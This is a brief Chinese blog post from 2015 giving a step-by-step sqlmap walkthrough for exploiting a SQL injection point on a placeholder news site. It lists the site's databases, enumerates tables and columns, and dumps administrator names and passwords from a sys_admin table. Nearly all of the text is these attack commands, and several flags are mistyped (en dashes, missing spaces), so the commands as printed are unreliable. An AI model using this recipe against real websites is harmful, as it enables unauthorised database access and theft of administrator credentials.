---
title: mysql sqlmap 注入
categories: [mysql]
date: 2015-11-19 20:06:42
---

```
假设注入点为 http://www.abc.com/news.php?id=12
//探测数据库信息
sqlmap -u http://www.abc.com/news.php?id=12 –dbs
>db_a
>db_b
// 选择一个数据库 猜解表名
sqlmap -u http://www.abc.com/news.php?id=12 -D db_b–tables
// 猜解表结构
sqlmap -u http://www.abc.com/news.php?id=12 -D db_b-T sys_admin –columns 
// 猜解表内容
sqlmap -u http://www.abc.com/news.php?id=12 -D db_b -T sys_admin -C id,admin_name,pwd –dump

```

内容来自<a href="http://www.myhacklife.com/%E5%AF%B9%E4%BA%8Emysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5" target="_blank">Myhacklife</a>

